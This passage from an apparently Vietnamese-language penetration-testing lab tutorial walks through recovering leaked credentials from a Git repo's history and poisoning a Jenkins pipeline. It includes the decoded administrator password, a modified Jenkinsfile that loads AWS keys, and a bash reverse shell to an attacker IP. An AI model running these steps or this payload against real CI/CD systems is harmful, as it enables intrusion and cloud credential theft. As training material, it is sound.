README có nhắc đến thư mục scripts và cách upload lên S3. Bây giờ chúng ta biết mình có thể tải file README.md, hãy thử tải phần còn lại của bucket và kiểm tra các script đó. Chúng ta sẽ bắt đầu bằng cách tạo một thư mục mới tên là **static_content**. Sau đó chúng ta sẽ dùng lệnh **aws s3**, nhưng với toán tử **sync** để đồng bộ toàn bộ nội dung từ một nguồn sang một đích. Chúng ta sẽ chỉ định **s3://staticcontent-lgudbhv8syu2tgbk** là nguồn và thư mục mới tạo là đích.

```
kali@kali:~$ mkdir static_content                                     

kali@kali:~$ aws s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./static_content/
download: s3://staticcontent-lgudbhv8syu2tgbk/.git/COMMIT_EDITMSG to static_content/.git/COMMIT_EDITMSG
...
download: s3://staticcontent-lgudbhv8syu2tgbk/images/kittens.jpg to static_content/images/kittens.jpg

kali@kali:~$ cd static_content

kali@kali:~/static_content$ 
```

                                                      *Listing 15 - Downloading the S3 bucket*

Hãy bắt đầu bằng việc xem script trong **scripts/upload-to-s3.sh**. Dựa trên nội dung của README, chúng ta có thể giả định đây là script được dùng để upload nội dung lên S3. Trong file này, chúng ta đang tìm kiếm bất kỳ AWS access key hard-coded tiềm năng nào mà developer có thể đã quên.

```
kali@kali:~/static_content$ cat scripts/upload-to-s3.sh
# Upload images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-lgudbhv8syu2tgbk/ 
```

                                                        *Listing 16 - Review S3 upload script*

Không may cho chúng ta, script không chứa secrets. Nó có vẻ khá đơn giản và chỉ upload nội dung của repo lên S3. Hãy liệt kê thư mục scripts và kiểm tra xem các script khác có chứa thông tin hữu ích không.

```
kali@kali:~/static_content$ ls scripts               
update-readme.sh  upload-to-s3.sh

kali@kali:~/static_content$ cat -n scripts/update-readme.sh
01  # Update Readme to include collaborators images to s3
02
03  SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
04
05  SECTION="# Collaborators"
06  FILE=$SCRIPT_DIR/../README.md
07
08  if [ "$1" == "-h" ]; then
09    echo "Update the collaborators in the README.md file"
10    exit 0
11  fi
12
13  # Check if both arguments are provided
14  if [ "$#" -ne 2 ]; then
15    # If not, display a help message
16    echo "Usage: $0 USERNAME PASSWORD"
17    exit 1
18  fi
19
20  # Store the arguments in variables
21  username=$1
22  password=$2
23
24  auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
25
26  USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
27
28  sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
29  echo "$SECTION" >> $FILE
30  echo "$USERNAMES" >> $FILE
31  echo "" >> $FILE
```

                                                  *Listing 17 - Review update-readme Script*

Có vẻ script **update-readme.sh** lấy danh sách collaborators từ SCM server và cập nhật file **README.md**. Dựa trên link được dùng ở dòng 26, **Jack** có vẻ là chủ repo. Như chúng ta đã nghi ngờ trước đó, SCM có chứa các repo private.

Chúng ta có thể xác định rằng script nhận một username và password làm đối số. Điều này quan trọng để ghi chú vì nếu chúng ta có thể tìm bash history của một user đã thực thi script này, chúng ta có thể tìm được credentials của một git user.

Hiện tại, đó là tất cả những gì hữu ích chúng ta có thể lấy từ file này. Tuy nhiên, vì đây là một git repo, chúng ta có toàn bộ lịch sử của tất cả các thay đổi đã được thực hiện với repo này. Hãy dùng một phương pháp luận đặc thù cho git hơn để tìm kiếm dữ liệu nhạy cảm.

---

## 4.2. Tìm Secrets trong Git

---

Vì git không chỉ lưu các file trong repo mà còn lưu toàn bộ lịch sử của nó, nên khi tìm secrets, điều quan trọng là chúng ta cũng phải xem xét lịch sử. Mặc dù một số công cụ có thể giúp chúng ta việc này, nhưng cũng quan trọng không kém là thực hiện một lần rà soát thủ công sơ bộ nếu các script tự động không tìm thấy gì.

Một công cụ chúng ta có thể dùng cho việc này là **gitleaks**. Trước tiên chúng ta cần cài đặt nó. Hãy dùng **apt** để cập nhật danh sách package, sau đó cài đặt package **gitleaks**.

```
kali@kali:~/static_content$ sudo apt update         
...

kali@kali:~/static_content$ sudo apt install -y gitleaks
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  gitleaks
...
```

                                                                 *Listing 18 - Installing gitleaks*

Để chạy gitleaks, chúng ta cần đảm bảo đang ở thư mục root của folder **static_content**. Sau đó chúng ta sẽ chạy binary **gitleaks** với subcommand **detect**.

```bash
kali@kali:~/static_content$ gitleaks detect

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks 

1:58PM INF no leaks found
1:58PM INF scan completed in 61.787205ms
```

                                                 *Listing 19 - Using gitleaks to Search for Secrets*

Không may, gitleaks không tìm thấy gì. Tuy nhiên, việc review thủ công luôn rất quan trọng. Dù chúng ta không thể phát hiện mọi thứ, chúng ta có thể tập trung vào các mục cụ thể thu hút sự chú ý của mình. Hãy bắt đầu bằng cách chạy **git log**, lệnh này sẽ liệt kê tất cả các commit trong branch hiện tại.

```
kali@kali:~/static_content$ git log
commit 07feec62e57fec8335e932d9fcbb9ea1f8431305 (HEAD -> master, origin/master)
Author: Jack <jack@offseclab.io>

    Add Jenkinsfile

commit 64382765366943dd1270e945b0b23dbed3024340
Author: Jack <jack@offseclab.io>

    Fix issue

commit 54166a0803785d745d68f132cde6e3859f425c75
Author: Jack <jack@offseclab.io>

    Add Managment Scripts

commit 5c22f52b6e5efbb490c330f3eb39949f2dfe2f91
Author: Jack <jack@offseclab.io>

    add Docker

commit 065abcd970335c35a44e54019bb453a4abd59210
Author: Jack <jack@offseclab.io>

    Add index.html

commit 6e466ede070b7fb44e0ef38bef3504cf87e866d0
Author: Jack <jack@offseclab.io>

    Add images

commit 85c736662f2644783d1f376dcfc1688e37bd1991
Author: Jack <jack@offseclab.io>

    Init Repo
```

                                                             *Listing 20 - Review Git History*

Lệnh này output git commit log theo thứ tự giảm dần theo thời điểm commit được tạo. Trong git history, chúng ta thấy rằng sau khi thêm management scripts, một issue đã cần được sửa. Hãy kiểm tra xem đã thay đổi gì. Để làm điều này, chúng ta sẽ dùng **git show** và truyền vào commit hash.

<aside>
⚠️

Commit hash của bạn sẽ khác so với cái được hiển thị ở đây.

</aside>

```
kali@kali:~/static_content$ git show 64382765366943dd1270e945b0b23dbed3024340
commit 64382765366943dd1270e945b0b23dbed3024340
Author: Jack <jack@offseclab.io>

    Fix issue

diff --git a/scripts/update-readme.sh b/scripts/update-readme.sh
index 94c67fc..c2fcc19 100644
--- a/scripts/update-readme.sh
+++ b/scripts/update-readme.sh
@@ -1,4 +1,5 @@
 # Update Readme to include collaborators images to s3
+
 SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 
 SECTION="# Collaborators"
@@ -9,9 +10,22 @@ if [ "$1" == "-h" ]; then
   exit 0
 fi
 
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu' | jq .\[\].username |  tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
 
 sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
 echo "$SECTION" >> $FILE
 echo "$USERNAMES" >> $FILE
-echo "" >> $FILE
+echo "" >> $FILE
\ No newline at end of file
```

                                                                *Listing 21 - Review Git Diff*

Từ output, chúng ta thấy developer đã xóa một authorization header được điền sẵn và thay thế bằng khả năng truyền credentials thông qua command line. Những sai sót như vậy rất phổ biến khi developer đang test một script. Credentials được điền sẵn trước đó có thể vẫn còn hợp lệ và cung cấp cho chúng ta quyền truy cập sâu hơn vào SCM server. Hãy decode header và thử các credentials.

HTTP basic authentication header được base64-encode theo định dạng sau: `<username>:<password>`. Để decode nó, chúng ta cần dùng lệnh **base64** với tham số **--decode**. Chúng ta sẽ dùng **echo** với giá trị header để pipe vào utility base64.

```
kali@kali:~/static_content$ echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
administrator:9nwkqe5hlbcmc91n
```

                                                              *Listing 22 - Decoding the header*

Credentials sẽ khác trong lab của bạn.

Hãy thử dùng các credentials này trên SCM server. Chúng ta sẽ điều hướng tới trang login và nhấp **Sign In**.

![image.png](image%207.png)

                                                              *Hình 8: Đăng nhập vào gitea*

Khi chúng ta nhấp Sign In, chúng ta được đưa tới trang home của user!

![image.png](image%208.png)

                                                      *Hình 9: Đăng nhập dưới quyền Administrator*

Bây giờ chúng ta đã có quyền truy cập nhiều thông tin hơn, chúng ta cần bắt đầu lại quá trình liệt kê.

---

# 5. Đầu độc Pipeline

---

Bây giờ chúng ta đã có quyền truy cập để xem các git repository, chúng ta có thể liệt kê sâu hơn và thử đầu độc pipeline. Một pipeline trong CI/CD đề cập đến các hành động phải được thực hiện để phân phối một phiên bản mới của một ứng dụng. Bằng cách tự động hóa nhiều bước này, các hành động trở nên có thể lặp lại. Pipeline có thể bao gồm việc biên dịch một chương trình, khởi tạo dữ liệu cho một cơ sở dữ liệu, cập nhật một cấu hình, và nhiều thứ khác.

Trong nhiều tình huống, file định nghĩa pipeline có thể được tìm thấy trong cùng repo chứa source của ứng dụng. Với GitLab, đó là file **.gitlab-ci.yml**. Với GitHub, các file như vậy được định nghĩa trong thư mục **.github/workflows**. Với Jenkins, một **Jenkinsfile** được sử dụng. Mỗi loại trong số này có cú pháp riêng để cấu hình.

Thông thường, các hành động cụ thể sẽ kích hoạt pipeline chạy. Ví dụ, một commit lên nhánh main có thể kích hoạt một pipeline, hoặc một pull request gửi tới repo có thể kích hoạt một pipeline để kiểm thử các thay đổi.

Learning Unit này bao gồm các Learning Objective sau:

- Phát hiện pipelines trong các repository hiện có
- Hiểu cách sửa đổi một file pipeline
- Học cách lấy một shell từ pipeline builder
- Phát hiện thêm thông tin từ builder

---

## **5.1. Enumerating the Repositories**

---

Bây giờ chúng ta đã được xác thực, hãy thử truy cập lại danh sách repositories. Chúng ta sẽ nhấp **Explore** ở menu trên cùng.

![image.png](image%209.png)

                                               *Hình 10: Explore với tư cách người dùng đã xác thực*

Lần này, chúng ta sẽ thấy một danh sách repositories. Một trong số đó là repo **static_content** mà chúng ta đã tải xuống trước đó. Trước đó, chúng ta đã phát hiện một **Jenkinsfile** trong repo này. Bây giờ chúng ta có quyền truy cập vào repo thực tế, chúng ta có thể sửa đổi nó và giành được thực thi mã trên build server. Hãy mở repo này và Jenkinsfile để kiểm tra thêm.

```
01  pipeline {
02      agent any   
03      // TODO automate the building of this later
04      stages {
05          stage('Build') {
06              steps {
07                  echo 'Building..'
08              }
09          }
10          stage('Test') {
11              steps {
12                  echo 'Testing..'
13              }
14          }
15          stage('Deploy') {
16              steps {
17                  echo 'Deploying....'
18              }
19          }
20      }
21  }      
```

                                                     *Listing 23 - Jenkinsfile in static_content*

Ở dòng 1, chúng ta thấy định nghĩa cho pipeline. Ở dòng 2, chúng ta thấy định nghĩa agent để chạy pipeline này. Thông thường, CI/CD controller và builder là các hệ thống khác nhau. Điều này cho phép mỗi hệ thống được thiết kế đúng mục đích hơn, thay vì một hệ thống đơn lẻ cồng kềnh. Trong Jenkinsfile này, pipeline định nghĩa rằng nó có thể được thực thi trên bất kỳ agent nào có sẵn.

Ở dòng 4, các stages được khai báo với 3 step riêng biệt được định nghĩa ở các dòng 5, 10, và 15. Mỗi step chỉ hiển thị một chuỗi. Không may cho chúng ta, dòng 3 chỉ ra rằng họ vẫn cần triển khai pipeline này, nghĩa là đây không phải mục tiêu tốt cho chúng ta.

Có vẻ repo này không có pipeline hợp lệ được cấu hình. Hãy kiểm tra repository **image-transform** tiếp theo và cố gắng tìm thứ gì đó hữu ích.

![image.png](image%2010.png)

                                                *Hình 11: Xem xét repository image-transform*

Repo này chỉ có ba file. Dựa trên phần mô tả, chúng ta sẽ thấy đây là một CloudFormation template. Chúng ta cũng sẽ thấy có một Jenkinsfile trong repo này. Hãy mở nó và xem pipeline.

```
01 pipeline {
02    agent any
03
04    stages {
05
06      
07      stage('Validate Cloudfront File') {
08        steps {
09          withAWS(region:'us-east-1', credentials:'aws_key') {
10              cfnValidate(file:'image-processor-template.yml')
11          }
12        }
13      }
14
15      stage('Create Stack') {
16        steps {
17          withAWS(region:'us-east-1', credentials:'aws_key') {
18              cfnUpdate(
19                  stack:'image-processor-stack', 
20                  file:'image-processor-template.yml', 
21                  params:[
22                      'OriginalImagesBucketName=original-images-lgudbhv8syu2tgbk',
23                      'ThumbnailImageBucketName=thumbnail-images--lgudbhv8syu2tgbk'
24                  ], 
25                  timeoutInMinutes:10, 
26                  pollInterval:1000)
27          }
28        }
29      }
30    }
31  }
```

                                                *Listing 24 - Jenkinsfile in image-transform*

Một lần nữa, chúng ta thấy định nghĩa pipeline ở dòng 1 và việc sử dụng bất kỳ builder agent nào ở dòng 2. Tuy nhiên, lần này chúng ta thực sự có một số steps. Điều đầu tiên nổi bật là việc sử dụng **withAWS** ở các dòng 9 và 17. Điều này hướng dẫn Jenkins tải AWS plugin. Quan trọng hơn, nó hướng dẫn plugin tải với một bộ credentials. Ở cả dòng 9 và 17, chúng ta thấy credentials có tên **"aws_key"** được load ở đây. Việc này sẽ đặt các biến môi trường **AWS_ACCESS_KEY_ID** cho access key ID, **AWS_SECRET_ACCESS_KEY** cho secret key, và **AWS_DEFAULT_REGION** cho region.

Miễn là quản trị viên đã thiết lập mọi thứ đúng cách, account được cấu hình cho các credentials này tối thiểu phải có quyền tạo, sửa đổi, và xóa mọi thứ trong CloudFormation template. Nếu chúng ta có thể lấy được các credentials này, chúng ta có thể leo thang xa hơn.

Chúng ta cũng nên xem CloudFormation template. Chúng ta sẽ chia template thành nhiều listing và giải thích từng phần.

```
01  AWSTemplateFormatVersion: '2010-09-09'
02
03  Parameters:
04    OriginalImagesBucketName:
05      Type: String
06      Description: Enter the name for the Original Images Bucket
07    ThumbnailImageBucketName:
08      Type: String
09      Description: Enter the name for the Thumbnail Images Bucket
10
11  Resources:
12    # S3 buckets for storing original and thumbnail images
13    OriginalImagesBucket:
14      Type: AWS::S3::Bucket
15      Properties:
16        BucketName: !Ref OriginalImagesBucketName
17        AccessControl: Private
18    ThumbnailImagesBucket:
19      Type: AWS::S3::Bucket
20      Properties:
21        BucketName: !Ref ThumbnailImageBucketName
22        AccessControl: Private
```

                                              *Listing 25 - S3 buckets in Cloudformation*

Phần đầu của CloudFormation template nhận các tham số cho tên của hai bucket. Một bucket chứa ảnh gốc, trong khi bucket còn lại chứa thumbnails. Dựa trên tên repository và bucket, chúng ta có thể giả định ứng dụng này xử lý ảnh và tạo thumbnails.

Tiếp theo, chúng ta thấy định nghĩa của một lambda function.

```
24    ImageProcessorFunction:
25      Type: 'AWS::Lambda::Function'
26      Properties:
27        FunctionName: ImageTransform
28        Handler: index.lambda_handler
29        Runtime: python3.9
30        Role: !GetAtt ImageProcessorRole.Arn
31        MemorySize: 1024
32        Environment:
33          Variables:
34            # S3 bucket names
35            ORIGINAL_IMAGES_BUCKET: !Ref OriginalImagesBucket
36            THUMBNAIL_IMAGES_BUCKET: !Ref ThumbnailImagesBucket
37        Code:
38          ZipFile: |
39            import boto3
40            import os
41            import json
42
43            SOURCE_BUCKET = os.environ['ORIGINAL_IMAGES_BUCKET']
44            DESTINATION_BUCKET = os.environ['THUMBNAIL_IMAGES_BUCKET']
45
46
47            def lambda_handler(event, context):
48                s3 = boto3.resource('s3')
49
50                # Loop through all objects in the source bucket
51                for obj in s3.Bucket(SOURCE_BUCKET).objects.all():
52                    # Get the file key and create a new Key object
53                    key = obj.key
54                    copy_source = {'Bucket': SOURCE_BUCKET, 'Key': key}
55                    new_key = key
56                    
57                    # Copy the file from the source bucket to the destination bucket
58                    # TODO: this should process the image and shrink it to a more desirable size
59                    s3.meta.client.copy(copy_source, DESTINATION_BUCKET, new_key)
60                return {
61                    'statusCode': 200,
62                    'body': json.dumps('Success')
63                }
65    ImageProcessorScheduleRule:
66      Type: AWS::Events::Rule
67      Properties:
68        Description: "Runs the ImageProcessorFunction daily"
69        ScheduleExpression: rate(1 day)
70        State: ENABLED
71        Targets:
72          - Arn: !GetAtt ImageProcessorFunction.Arn
73            Id: ImageProcessorFunctionTarget      
```

                                          *Listing 26 - Lambda Function in Cloudformation*

Lambda function tạo các biến môi trường dựa trên tên của S3 bucket ở các dòng 35 và 36. Các dòng 38 đến 63 định nghĩa nội dung của lambda function. Chúng ta cũng có một rule để chạy lambda function hằng ngày ở các dòng 65-73. Ở dòng 30, chúng ta thấy lambda function có một role được gán cho nó. Nếu chúng ta có thể sửa đổi lambda function này, chúng ta có thể trích xuất credentials cho user đó. Hãy tiếp tục xem file này và xác định role này có thể truy cập gì.

```
 74    ImageProcessorRole:
 75      Type: AWS::IAM::Role
 76      Properties:
 77        AssumeRolePolicyDocument:
 78          Version: '2012-10-17'
 79          Statement:
 80          - Effect: Allow
 81            Principal:
 82              Service:
 83              - lambda.amazonaws.com
 84            Action:
 85            - sts:AssumeRole
 86        Path: "/"
 87        Policies:
 88        - PolicyName: ImageProcessorLogPolicy
 89          PolicyDocument:
 90            Version: '2012-10-17'
 91            Statement:
 92            - Effect: Allow
 93              Action:
 94              - logs:CreateLogGroup
 95              - logs:CreateLogStream
 96              - logs:PutLogEvents
 97              Resource: "*"
 98        - PolicyName: ImageProcessorS3Policy
 99          PolicyDocument:
100            Version: '2012-10-17'
101            Statement:
102            - Effect: Allow
103              Action:
104                - "s3:PutObject"
105                - "s3:GetObject"
106                - "s3:AbortMultipartUpload"
107                - "s3:ListBucket"
108                - "s3:DeleteObject"
109                - "s3:GetObjectVersion"
110                - "s3:ListMultipartUploadParts"
111              Resource:
112                - !Sub arn:aws:s3:::${OriginalImagesBucket}
113                - !Sub arn:aws:s3:::${OriginalImagesBucket}/*
114                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}
115                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}/*
```

                              *Listing 27 - IAM policy for Lambda function in Cloudformation*

Định nghĩa policy cho phép cập nhật logs (dòng 88-97), cũng như quyền truy cập để lấy và cập nhật các object trong bucket (dòng 98-115). Mặc dù đây là quyền mà hiện tại chúng ta chưa có, nhưng nó không phải con đường “béo bở” nhất mà chúng ta có thể đi xuống.

Các credentials mà chúng ta tìm thấy trong Jenkinsfile cần có quyền để áp dụng CloudFormation template này. Do đó, quyền của nó sẽ luôn cao hơn những gì chúng ta có trong lambda function.

Tuy nhiên, mặc dù chúng ta rất có thể chỉnh sửa Jenkinsfile (vì bây giờ chúng ta có quyền truy cập repo), chúng ta cần kiểm tra cách trigger build. Jenkins có thể được cấu hình để chỉ chạy khi có can thiệp thủ công; nếu đúng như vậy, chúng ta cần tiếp tục khám phá. Nó cũng có thể được cấu hình để thực thi pipeline theo định kỳ. Trong kịch bản đó, chúng ta sẽ không biết cách trigger nó cho đến khi nó thực thi. Tuy nhiên, Jenkins cũng có thể được cấu hình để chạy build cho mỗi thay đổi trong repo. Việc này thường được thực hiện bằng cách để SCM server gọi một webhook cho các trigger cụ thể. Hãy kiểm tra xem repo có cấu hình nào sẽ thực thi pipeline theo các hành động nhất định hay không.

Trong Gitea, webhooks có thể được tìm thấy trong tab **Webhooks** dưới **Settings**.

![image.png](image%2011.png)

                                                    *Hình 12: Xem Webhooks dưới Settings*

Có vẻ như đã có một webhook được cấu hình! Hãy kiểm tra kỹ hơn để tìm xem điều gì trigger webhook.

![image.png](image%2012.png)

                                                         *Hình 13: Xem các Webhook Triggers*

Dựa trên các thiết lập, một **Git Push** sẽ gửi một webhook tới automation server. Tiếp theo, hãy thử sửa Jenkinsfile để lấy một reverse shell từ builder.

---

## **5.2. Modifying the Pipeline**

---

Trước khi chúng ta chỉnh sửa Jenkinsfile và push thay đổi, chúng ta cần xác định mục tiêu của mình. Chúng ta có thể sửa file để chỉ exfiltrate AWS keys, hoặc chúng ta có thể lấy một reverse shell đầy đủ. Hãy thử lựa chọn reverse shell, vì nó cho phép chúng ta liệt kê builder sâu hơn và có khả năng phát hiện thêm dữ liệu nhạy cảm.

Chúng ta sẽ phải đưa ra một giả định về hệ điều hành mục tiêu vì chúng ta không tìm thấy bất kỳ thứ gì cho biết builder chạy Windows hay Linux. Hãy mặc định là Linux và điều chỉnh sang Windows nếu cần.

Cú pháp của Jenkinsfile là một domain-specific language (DSL) dựa trên ngôn ngữ Groovy. Điều này có nghĩa là chúng ta sẽ cần viết reverse shell của mình theo cú pháp Jenkins DSL. Hãy viết payload của chúng ta trong một text editor trước, rồi sau đó push lên repository. Chúng ta sẽ bắt đầu với một định nghĩa pipeline cơ bản.

```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        echo 'Building..'
      }
    }
  }
}
```

                                                             *Listing 28 - Basic Jenkinsfile*

Chúng ta muốn giữ lại AWS credentials từ Jenkinsfile ban đầu, vì vậy hãy thêm phần đó vào dưới mục steps.

```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          echo 'Building..'
        }
      }
    }
  }
```

                                                       *Listing 28 - Basic Jenkinsfile - withAWS*

Điều quan trọng cần lưu ý là hàm withAWS không phải là tiêu chuẩn. Jenkins phụ thuộc rất nhiều vào plugins để mở rộng chức năng. Hàm withAWS là một tính năng của AWS Steps plugin. Mặc dù AWS Steps plugin khá phổ biến, nó không có mặt trên mọi bản cài Jenkins. Tuy nhiên, vì chúng ta biết pipeline này đã và đang sử dụng nó, chúng ta có thể giả định rằng nó đã được cài.

Bây giờ khi echo chạy, nó sẽ thực thi với AWS credentials. Hãy chỉnh sửa để làm nó hữu ích hơn. Chúng ta sẽ bắt đầu bằng cách thêm một khối script. Mặc dù không bắt buộc, nó cho phép chúng ta mở rộng pipeline với nhiều tính năng hơn (như kiểm tra hệ điều hành đang dùng).

```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            echo 'Building..'
          }
        }
      }
    }
  }
}
```

                                                         *Listing 28 - Basic Jenkinsfile - script*

Vì Groovy có thể được dùng trong phần script này, suy nghĩ tự nhiên của chúng ta có thể là viết reverse shell bằng Groovy.

Mặc dù Groovy có thể được dùng trong phần script của Jenkinsfile, nó sẽ thực thi phần Groovy trong một sandbox với quyền truy cập rất hạn chế đến các internal APIs. Điều này nghĩa là chúng ta có thể tạo biến mới, nhưng sẽ không thể truy cập internal APIs, điều mà trên thực tế ngăn chúng ta lấy được shell. Một quản trị viên Jenkins có thể phê duyệt scripts hoặc bật auto-approval. Với thông tin chúng ta có, không có cách nào biết một Groovy script sẽ chạy hay không, nên tốt nhất là tránh dùng Groovy script làm reverse shell.

Thay vào đó, chúng ta có thể dựa vào các plugins khác để thực thi system commands. Một plugin tên là Nodes and Processes cho phép developer thực thi shell commands trực tiếp trên builder bằng cách dùng bước sh. Dù Nodes and Processes là một plugin, nó được phát triển bởi Jenkins và là một trong những plugin phổ biến nhất được cài trên Jenkins. Ngoài việc thực thi system commands, nó cũng bật các chức năng cơ bản, chẳng hạn như đổi thư mục bằng dir. Chúng ta có thể giả định với độ chắc chắn cao rằng một Jenkins server có cài nó.

Hãy bắt đầu bằng cách thực thi một thứ khá đơn giản (như một curl) quay về máy Kali của chúng ta. Chúng ta sẽ phải dùng IP của cloud Kali vì máy local của chúng ta có thể không có public IP. Điều này sẽ giúp chúng ta xác định chính xác hơn liệu script có thực sự được thực thi hay không.

```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            sh 'curl http://192.88.99.76/'
          }
        }
      }
    }
  }
}
```

                                                             *Listing 28 - Basic Jenkinsfile - curl*

Script hiện tại này sẽ crash nếu nó được thực thi trên Windows. Hãy chỉnh sửa để nó chỉ thực thi nếu chúng ta đang chạy trên một hệ thống Unix-based. Chúng ta sẽ làm điều này bằng cách thêm một câu lệnh if dưới script và dùng hàm isUnix để xác minh OS. Chúng ta cũng sẽ đổi lệnh curl để xác nhận rằng chúng ta đang chạy trên Unix system. Điều này rất hữu ích cho việc debug nếu có điều gì đó sai.

Mọi thứ chúng ta đang làm trong ví dụ này không yêu cầu truy cập internal Groovy APIs và sẽ không cần phê duyệt bổ sung.

```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'curl http://192.88.99.76/unix'
            }
          }
        }
      }
    }
  }
}
```

                                                       *Listing 28 - Basic Jenkinsfile - isUnix*

Hãy dành chút thời gian để test đoạn code này. Trong một kịch bản thực tế, chúng ta có thể trì hoãn việc chạy để tránh kích hoạt một kiểu cảnh báo nào đó. Tuy nhiên, trong trường hợp này, chúng ta có thể thực thi pipeline nhiều lần.

Để test, trước hết chúng ta cần khởi chạy Apache trên Kali để bắt callback từ curl và một listener để bắt reverse shell. Hãy ssh vào cloud Kali machine bằng mật khẩu được cung cấp khi lab được khởi động.

```
kali@kali:~$ ssh kali@192.88.99.76
The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
kali@192.88.99.76's password: 
kali@cloud-kali:~$ 
```

                                                               *Listing 29 - Logging into Kali*

Tiếp theo, chúng ta sẽ khởi chạy apache2 bằng cách chạy sytemctl và động từ start để khởi động service apache2.

```bash
kali@cloud-kali:~$ sudo systemctl start apache2
```

                                                          *Listing 30 - Starting apache2 on Kali*

Tiếp theo, chúng ta cần cập nhật Jenkinsfile trong repo và trigger pipeline để bắt đầu. Chúng ta có thể clone repo và push bằng lệnh git, nhưng Gitea cung cấp một cách đơn giản hơn để làm việc này qua UI.

Hãy quay lại Jenkinsfile trong SCM server và nhấp nút **Edit**.

![image.png](image%2013.png)

                                                                  *Hình 14: Sửa Jenkinsfile*

Sau khi chúng ta dán Jenkinsfile với payload, chúng ta có thể cuộn xuống cuối và commit thay đổi. Việc này sẽ trigger push cần thiết cho webhook.

![image.png](image%2014.png)

                                                            *Hình 15: Commit Jenkinsfile*

Pipeline code mà chúng ta cung cấp sẽ thực thi khá nhanh. Tuy nhiên, nó vẫn sẽ mất vài khoảnh khắc để webhook được thực thi và để Jenkins khởi tạo môi trường. Ngay sau khi chúng ta commit Jenkinsfile, chúng ta có thể kiểm tra Apache logs trong **/var/log/apache2/access.log**. Chúng ta đang tìm một hit vào endpoint **/unix**, điều này sẽ xác nhận rằng chúng ta có thể thực thi code và rằng chúng ta đang chạy trên một hệ thống Unix-based.

```
kali@cloud-kali:~$ cat /var/log/apache2/access.log
198.18.53.73 - - [27/Apr/2023:19:34:40 +0000] "GET /unix HTTP/1.1" 404 436 "-" "curl/7.74.0"
```

                                                         *Listing 30 - Checking apache logs*

Tuyệt vời! Bây giờ, chúng ta có thể thực thi một lệnh để gửi reverse shell về máy Kali của mình. Một lần nữa, điều quan trọng là chúng ta dùng IP của cloud Kali machine chứ không phải local Kali machine. Chúng ta cũng sẽ dùng reverse shell để phụ thuộc tối thiểu vào thư viện.

```
bash -i >& /dev/tcp/192.88.99.76/4242 0>&1
```

                                                                    *Listing 31 - Reverse shell*

Hãy đảm bảo thay IP thành cloud Kali machine của bạn.

Mặc dù lệnh này có vẻ phức tạp, chúng ta có thể phân tách nó để hiểu rõ hơn. Nó đang thực thi một phiên bash tương tác (-i), redirect cả stdout và stderr (>&) của phiên bash đó tới Kali machine (/dev/tcp/192.88.99.76/4242) và cũng redirect stdin từ kết nối mạng vào phiên bash. Điều này về cơ bản cho phép chúng ta tương tác với reverse shell.

Mặc dù tồn tại các reverse shell khác dùng Perl và Python, chúng ta muốn hạn chế việc phụ thuộc vào các ngôn ngữ bổ sung có thể không được cài trên mục tiêu.

Trước khi chúng ta thêm payload reverse shell vào Jenkinsfile, chúng ta sẽ bọc toàn bộ nó trong một lệnh bash nữa. Khi xử lý redirect, pipes và reverse shells, luôn tốt khi thực thi payload trong một phiên bash khác bằng cách dùng -c để chỉ định lệnh cần chạy. Ví dụ: `bash -c "PAYLOAD GOES HERE"`. Lý do là vì chúng ta không chắc builder sẽ thực thi code như thế nào hoặc liệu các redirection có hoạt động hay không. Tuy nhiên, nếu bọc trong bash, chúng ta có thể đảm bảo nó được thực thi trong một môi trường mà redirections sẽ hoạt động. Chúng ta cũng sẽ thêm dấu ampersand ở cuối để đưa lệnh vào process background, để việc thực thi không dừng lại do timeout.

```
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```

                                               *Listing 32 - Basic Jenkinsfile - Final Payload*

